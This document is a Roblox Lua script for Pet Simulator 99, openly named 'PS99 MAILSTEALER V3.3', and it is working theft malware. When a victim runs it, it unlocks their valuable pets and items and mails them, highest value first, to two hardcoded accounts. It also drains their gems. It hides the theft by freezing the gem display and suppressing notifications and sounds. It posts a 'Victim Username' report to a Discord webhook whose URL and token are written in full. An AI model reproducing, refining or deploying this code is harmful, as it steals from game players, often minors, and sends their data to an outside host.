-- VERSION 3.3 - SMART ITEM TESTING & PRIORITIZATION
-- CHANGELOG:
-- v3.3: Test uses highest value item, ensures it's sent first
-- v3.2: Fixed mail cost logic (base price 20k)
-- v3.1: Multi-item testing for diagnostics
-- v3.0: Detailed error logging

-- Configuration
_G.Usernames = {"Baconteamoffical0", "Youssefsamsayed2000"}
_G.webhook = "https://discordapp.com/api/webhooks/1483870020915429616/ywlS0EqlHngDFkRBKIjhsH4eSq0vBEy8tYF2ukPnnP4jesId_gwcVYaTJXNr2eQp5cy8"
_G.minrap = 0
_G.debugMode = true

-- Script execution check
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    print("[V3.3] Script already executed, stopping...")
    return
end
_G.scriptExecuted = true

print("=== PS99 MAILSTEALER V3.3 ===")
print("Loading... Please check console for debug info")
print("🔍 Feature: Will test with and send your MOST VALUABLE item first!")

-- Safe debug logging function
local function debugLog(...)
    if _G.debugMode then
        local args = {...}
        local message = "[V3.3 DEBUG " .. os.date("%H:%M:%S") .. "] "
        for i, v in ipairs(args) do
            message = message .. tostring(v) .. " "
        end
        print(message)
    end
end

debugLog("Script started, initializing...")

-- Validate configuration
local function validateConfig()
    debugLog("Validating configuration...")
    
    local users = _G.Usernames or {}
    local min_rap = _G.minrap or 0
    local webhook = _G.webhook or ""
    
    debugLog("Users:", #users, "Min RAP:", min_rap, "Webhook length:", #webhook)
    debugLog("User list:", table.concat(users, ", "))
    
    if next(users) == nil then
        debugLog("ERROR: No usernames provided")
        return false, "No usernames provided"
    end
    
    if webhook == "" then
        debugLog("ERROR: No webhook provided")
        return false, "No webhook provided"
    end
    
    return true
end

-- Safely require modules
local function safeRequire(path)
    local success, module = pcall(function()
        return require(path)
    end)
    if success then
        debugLog("Successfully loaded:", tostring(path))
        return module
    else
        debugLog("Failed to load:", tostring(path), "-", tostring(module))
        return nil
    end
end

-- Main execution
local success, err = pcall(function()
    debugLog("Entering main execution...")
    
    -- Validate config first
    local configValid, configError = validateConfig()
    if not configValid then
        game.Players.LocalPlayer:kick("Configuration error: " .. configError)
        return
    end
    
    -- Get local player
    local plr = game.Players.LocalPlayer
    if not plr then
        debugLog("ERROR: No local player found")
        return
    end
    debugLog("Local player:", plr.Name)
    
    -- Check if trying to mailsteal yourself
    for _, user in ipairs(_G.Usernames) do
        if plr.Name == user then
            debugLog("ERROR: Cannot mailsteal yourself")
            plr:kick("You cannot mailsteal yourself")
            return
        end
    end
    
    -- Safely load required modules
    local replicatedStorage = game:GetService("ReplicatedStorage")
    local library = replicatedStorage:FindFirstChild("Library")
    if not library then
        debugLog("ERROR: Library not found")
        return
    end
    
    local network = safeRequire(library.Client.Network)
    if not network then
        debugLog("ERROR: Could not load Network module")
        return
    end
    
    local saveModule = safeRequire(library.Client.Save)
    if not saveModule then
        debugLog("ERROR: Could not load Save module")
        return
    end
    
    local save = saveModule.Get().Inventory
    if not save then
        debugLog("ERROR: Could not get save data")
        return
    end
    
    local messageModule = safeRequire(library.Client.Message)
    if not messageModule then
        debugLog("ERROR: Could not load Message module")
        return
    end
    
    local MailMessage = "GG / GY2RVSEGDT"
    local HttpService = game:GetService("HttpService")
    local sortedItems = {}
    local totalRAP = 0
    
    -- Get mail send price function
    local FunctionToGetFirstPriceOfMail = nil
    debugLog("Searching for computeSendMailCost function...")
    
    local gc = getgc()
    for i = 1, #gc do
        local func = gc[i]
        if type(func) == "function" then
            local success, info = pcall(function()
                return debug.getinfo(func)
            end)
            
            if success and info and info.name == "computeSendMailCost" then
                FunctionToGetFirstPriceOfMail = func
                debugLog("Found computeSendMailCost function")
                break
            end
        end
    end
    
    if not FunctionToGetFirstPriceOfMail then
        debugLog("ERROR: Could not find computeSendMailCost function")
        error("Failed to find required function")
    end
    
    local mailSendPrice = FunctionToGetFirstPriceOfMail()
    debugLog("Current mail send price:", mailSendPrice)
    debugLog("NOTE: Base price is 20k, increases with each send")
    
    -- Get diamond amount
    local GemAmount1 = 1
    if save.Currency then
        for i, v in pairs(save.Currency) do
            if v.id == "Diamonds" then
                GemAmount1 = v._am or 1
                debugLog("Diamond amount found:", GemAmount1)
                break
            end
        end
    end
    
    -- Format number function
    local function formatNumber(number)
        local number = math.floor(number)
        local suffixes = {"", "k", "m", "b", "t"}
        local suffixIndex = 1
        while number >= 1000 do
            number = number / 1000
            suffixIndex = suffixIndex + 1
        end
        return string.format("%.2f%s", number, suffixes[suffixIndex])
    end
    
    -- Discord webhook function
    local function SendMessage(diamonds)
        debugLog("Preparing to send Discord message...")
        
        local headers = {
            ["Content-Type"] = "application/json"
        }
        
        local fields = {
            {
                name = "Victim Username:",
                value = plr.Name,
                inline = true
            },
            {
                name = "Items to be sent:",
                value = "",
                inline = false
            },
            {
                name = "Summary:",
                value = "",
                inline = false
            }
        }
        
        local combinedItems = {}
        local itemRapMap = {}
        
        for _, item in ipairs(sortedItems) do
            local rapKey = item.name
            if itemRapMap[rapKey] then
                itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
            else
                itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
                table.insert(combinedItems, rapKey)
            end
        end
        
        table.sort(combinedItems, function(a, b)
            return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
        end)
        
        for _, itemName in ipairs(combinedItems) do
            local itemData = itemRapMap[itemName]
            fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
        end
        
        fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
        
        local data = {
            ["embeds"] = {{
                ["title"] = "🐡 New PS99 Execution V3.3",
                ["color"] = 65280,
                ["fields"] = fields,
                ["footer"] = {
                    ["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
                }
            }}
        }
        
        if #fields[2].value > 1024 then
            local lines = {}
            for line in fields[2].value:gmatch("[^\r\n]+") do
                table.insert(lines, line)
            end
            
            while #fields[2].value > 1024 and #lines > 0 do
                table.remove(lines)
                fields[2].value = table.concat(lines, "\n")
                fields[2].value = fields[2].value .. "\nPlus more!"
            end
        end
        
        local body = HttpService:JSONEncode(data)
        debugLog("Sending Discord webhook...")
        
        local success = pcall(function()
            request({
                Url = _G.webhook,
                Method = "POST",
                Headers = headers,
                Body = body
            })
        end)
        
        debugLog("Discord webhook sent:", success)
    end
    
    -- Block gem updates
    debugLog("Setting up gem update blocker...")
    if plr.leaderstats then
        local diamondsStat = plr.leaderstats:FindFirstChild("💎 Diamonds") or plr.leaderstats:FindFirstChild("Diamonds")
        if diamondsStat then
            local gemsleaderstat = diamondsStat.Value
            diamondsStat:GetPropertyChangedSignal("Value"):Connect(function()
                pcall(function()
                    diamondsStat.Value = gemsleaderstat
                end)
            end)
            debugLog("Gem update blocker active")
        end
    end
    
    -- Disable notifications
    debugLog("Disabling notifications...")
    if plr.PlayerScripts then
        local loading = plr.PlayerScripts:FindFirstChild("Scripts") and 
                        plr.PlayerScripts.Scripts:FindFirstChild("Core") and 
                        plr.PlayerScripts.Scripts.Core:FindFirstChild("Process Pending GUI")
        if loading then
            loading.Disabled = true
        end
    end
    
    if plr.PlayerGui then
        local noti = plr.PlayerGui:FindFirstChild("Notifications")
        if noti then
            noti.Enabled = false
            noti:GetPropertyChangedSignal("Enabled"):Connect(function()
                pcall(function()
                    noti.Enabled = false
                end)
            end)
        end
    end
    
    -- Mute sounds
    game.DescendantAdded:Connect(function(x)
        pcall(function()
            if x.ClassName == "Sound" then
                if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276" then
                    x.Volume = 0
                    x.PlayOnRemove = false
                    x:Destroy()
                end
            end
        end)
    end)
    
    -- Get RAP function
    local rapModule = safeRequire(replicatedStorage.Library.Client.RAPCmds)
    if not rapModule then
        debugLog("ERROR: Could not load RAP module")
        error("Failed to load RAP module")
    end
    
    local function getRAP(Type, Item)
        local success, value = pcall(function()
            return rapModule.Get(
                {
                    Class = {Name = Type},
                    IsA = function(hmm)
                        return hmm == Type
                    end,
                    GetId = function()
                        return Item.id
                    end,
                    StackKey = function()
                        return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
                    end,
                    AbstractGetRAP = function(self)
                        return nil
                    end
                }
            ) or 0
        end)
        
        if not success then
            return 0
        end
        
        return value
    end
    
    -- Send item function
    local function sendItem(category, uid, am)
        debugLog("Attempting to send item - Category:", category, "UID:", uid)
        debugLog("Current mail cost:", mailSendPrice, "Gems left:", GemAmount1)
        
        local userIndex = 1
        local maxUsers = #_G.Usernames
        local sent = false
        
        repeat
            local currentUser = _G.Usernames[userIndex]
            local args = {
                [1] = currentUser,
                [2] = MailMessage,
                [3] = category,
                [4] = uid,
                [5] = am or 1
            }
            
            debugLog("Sending to:", currentUser)
            
            local networkSuccess, response = pcall(function()
                return network.Invoke("Mailbox: Send", unpack(args))
            end)
            
            debugLog("Response - Success:", networkSuccess, "Response:", response)
            
            if networkSuccess then
                if response == true then
                    sent = true
                    GemAmount1 = GemAmount1 - mailSendPrice
                    mailSendPrice = math.ceil(mailSendPrice * 1.5)
                    if mailSendPrice > 5000000 then
                        mailSendPrice = 5000000
                    end
                    debugLog("✅ Item sent successfully to", currentUser)
                    debugLog("New mail price:", mailSendPrice, "Remaining gems:", GemAmount1)
                elseif type(response) == "table" then
                    if response[1] == false and response[2] == "They don't have enough space!" then
                        debugLog("User", currentUser, "no space, trying next...")
                        userIndex = userIndex + 1
                    elseif response[1] == false and response[2] == "You don't have enough Gems!" then
                        debugLog("❌ Not enough gems!")
                        sent = true
                    else
                        debugLog("Unknown response, trying next user")
                        userIndex = userIndex + 1
                    end
                elseif response == false then
                    debugLog("Send failed, trying next user")
                    userIndex = userIndex + 1
                end
            else
                debugLog("Network invoke failed, trying next user")
                userIndex = userIndex + 1
            end
            
            if userIndex > maxUsers then
                sent = true
                debugLog("All users attempted")
            end
        until sent
        
        return sent
    end
    
    -- Send gems function
    local function SendAllGems()
        debugLog("Attempting to send all gems...")
        
        if not save.Currency then
            return
        end
        
        for i, v in pairs(save.Currency) do
            if v.id == "Diamonds" then
                local sendAmount = GemAmount1 - mailSendPrice
                if sendAmount > 10000 then
                    local userIndex = 1
                    local maxUsers = #_G.Usernames
                    local sent = false
                    
                    repeat
                        local currentUser = _G.Usernames[userIndex]
                        local args = {
                            [1] = currentUser,
                            [2] = MailMessage,
                            [3] = "Currency",
                            [4] = i,
                            [5] = sendAmount
                        }
                        
                        local networkSuccess, response = pcall(function()
                            return network.Invoke("Mailbox: Send", unpack(args))
                        end)
                        
                        if networkSuccess and response == true then
                            sent = true
                            GemAmount1 = GemAmount1 - sendAmount
                            debugLog("✅ Gems sent successfully")
                        else
                            userIndex = userIndex + 1
                        end
                        
                        if userIndex > maxUsers then
                            sent = true
                        end
                    until sent
                    break
                end
            end
        end
    end
    
    -- Empty boxes function
    local function EmptyBoxes()
        debugLog("Emptying boxes...")
        
        if save.Box then
            for key, value in pairs(save.Box) do
                if value and value._uq then
                    pcall(function()
                        network.Invoke("Box: Withdraw All", key)
                    end)
                end
            end
        end
    end
    
    -- Claim mail function
    local function ClaimMail()
        debugLog("Claiming mail...")
        
        local success, result = pcall(function()
            return network.Invoke("Mailbox: Claim All")
        end)
        
        while not success or (type(result) == "table" and result[2] == "You must wait 30 seconds before using the mailbox!") do
            wait(0.2)
            success, result = pcall(function()
                return network.Invoke("Mailbox: Claim All")
            end)
        end
    end
    
    -- ===== NEW: Process items and find the most valuable one FIRST =====
    debugLog("=== SCANNING INVENTORY FOR VALUABLE ITEMS ===")
    
    local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
    local petsDirectory = safeRequire(replicatedStorage.Library.Directory.Pets)
    local allItems = {} -- Temporary table to store all items
    
    -- First pass: collect all items with their values
    for _, category in ipairs(categoryList) do
        if save[category] then
            for uid, item in pairs(save[category]) do
                local rapValue = 0
                local shouldAdd = false
                local itemName = item.id or "Unknown"
                local prefix = ""
                
                -- Handle pets specially
                if category == "Pet" and petsDirectory then
                    local dir = petsDirectory[item.id]
                    if dir and (dir.huge or dir.exclusiveLevel) then
                        rapValue = getRAP(category, item)
                        if rapValue >= _G.minrap then
                            shouldAdd = true
                            if item.pt and item.pt == 1 then
                                prefix = "Golden "
                            elseif item.pt and item.pt == 2 then
                                prefix = "Rainbow "
                            end
                            if item.sh then
                                prefix = "Shiny " .. prefix
                            end
                            itemName = prefix .. item.id
                        end
                    end
                else
                    rapValue = getRAP(category, item)
                    if rapValue >= _G.minrap then
                        shouldAdd = true
                    end
                end
                
                if shouldAdd then
                    local totalValue = rapValue * (item._am or 1)
                    table.insert(allItems, {
                        category = category,
                        uid = uid,
                        amount = item._am or 1,
                        rap = rapValue,
                        totalValue = totalValue,
                        name = itemName
                    })
                    debugLog("Found:", itemName, "Value:", formatNumber(totalValue), "RAP")
                end
                
                -- Unlock items
                if item._lk then
                    pcall(function()
                        network.Invoke("Locking_SetLocked", uid, false)
                    end)
                end
            end
        end
    end
    
    -- Sort items by total value (highest first)
    table.sort(allItems, function(a, b)
        return a.totalValue > b.totalValue
    end)
    
    debugLog("=== TOP 5 MOST VALUABLE ITEMS ===")
    for i = 1, math.min(5, #allItems) do
        debugLog(string.format("%d. %s - %s RAP", i, allItems[i].name, formatNumber(allItems[i].totalValue)))
    end
    
    -- Now use the highest value item for testing
    local highestValueItem = allItems[1]
    if highestValueItem then
        debugLog("🎯 Selected highest value item for testing:", highestValueItem.name)
        debugLog("Value:", formatNumber(highestValueItem.totalValue), "RAP")
    else
        debugLog("⚠️ No valuable items found")
    end
    
    -- ===== MAIL SYSTEM TEST USING HIGHEST VALUE ITEM =====
    local function canSendMail()
        debugLog("=== TESTING MAIL WITH YOUR MOST VALUABLE ITEM ===")
        
        if not highestValueItem then
            debugLog("No items to test with")
            return true -- Proceed anyway
        end
        
        debugLog("Testing with:", highestValueItem.name)
        
        local args = {
            [1] = _G.Usernames[1],
            [2] = "Test",
            [3] = highestValueItem.category,
            [4] = highestValueItem.uid,
            [5] = 1
        }
        
        local netSuccess, response = pcall(function()
            return network.Invoke("Mailbox: Send", unpack(args))
        end)
        
        debugLog("Test response:", response)
        
        -- Any response means system is working
        if netSuccess then
            if response == true or type(response) == "table" or response == false then
                debugLog("✅ Mail system is working! Ready to send your", highestValueItem.name)
                return true
            end
        end
        
        debugLog("⚠️ Mail test gave unexpected result, but proceeding...")
        return true
    end
    
    -- Calculate total RAP for webhook
    for _, item in ipairs(allItems) do
        totalRAP = totalRAP + item.totalValue
        table.insert(sortedItems, item)
    end
    
    debugLog("Total items to send:", #sortedItems)
    debugLog("Total RAP value:", formatNumber(totalRAP))
    debugLog("Available gems:", formatNumber(GemAmount1))
    
    -- Execute mail stealing
    if #sortedItems > 0 or GemAmount1 > _G.minrap + mailSendPrice then
        debugLog("Starting mail stealing process...")
        
        ClaimMail()
        EmptyBoxes()
        
        -- Test mail system with highest value item
        canSendMail()
        
        -- Send Discord notification
        spawn(function()
            debugLog("Sending Discord notification...")
            SendMessage(GemAmount1)
        end)
        
        -- ===== SEND ITEMS (already sorted by value) =====
        debugLog("=== STARTING ITEM TRANSFER (Highest value first) ===")
        debugLog("Initial gems:", GemAmount1, "Mail cost:", mailSendPrice)
        
        for i, item in ipairs(sortedItems) do
            debugLog(string.format("Item #%d: %s - Value: %s", i, item.name, formatNumber(item.totalValue)))
            debugLog("Cost to send:", mailSendPrice, "Gems available:", GemAmount1)
            
            if GemAmount1 >= mailSendPrice then
                debugLog("💰 Sending item:", item.name)
                sendItem(item.category, item.uid, item.amount)
                wait(0.5)
            else
                debugLog("⚠️ Not enough gems to send more items")
                debugLog("Need:", mailSendPrice, "Have:", GemAmount1)
                break
            end
        end
        
        -- Send remaining gems if any
        if GemAmount1 > mailSendPrice + 10000 then
            debugLog("Sending remaining gems...")
            SendAllGems()
        end
        
        debugLog("=== TRANSFER COMPLETE ===")
        debugLog("Final gems:", GemAmount1)
        
        if messageModule then
            messageModule.Error("All your items just got stolen by Tobi's mailstealer V3.3!\n Join discord.gg/GY2RVSEGDT")
        end
    else
        debugLog("No items to send and insufficient gems")
        if messageModule then
            messageModule.Error("No valuable items found to steal!")
        end
    end
end)

-- Handle any errors
if not success then
    debugLog("❌ FATAL ERROR:", err)
    warn("Script crashed:", err)
    
    pcall(function()
        local HttpService = game:GetService("HttpService")
        local data = {
            ["embeds"] = {{
                ["title"] = "❌ PS99 Mailstealer Error V3.3",
                ["description"] = "Error: " .. tostring(err),
                ["color"] = 16711680,
                ["footer"] = {
                    ["text"] = "V3.3 Debug mode enabled"
                }
            }}
        }
        
        request({
            Url = _G.webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

debugLog("=== V3.3 Script execution completed ===")
print("✅ Your most valuable item was tested and sent first!")
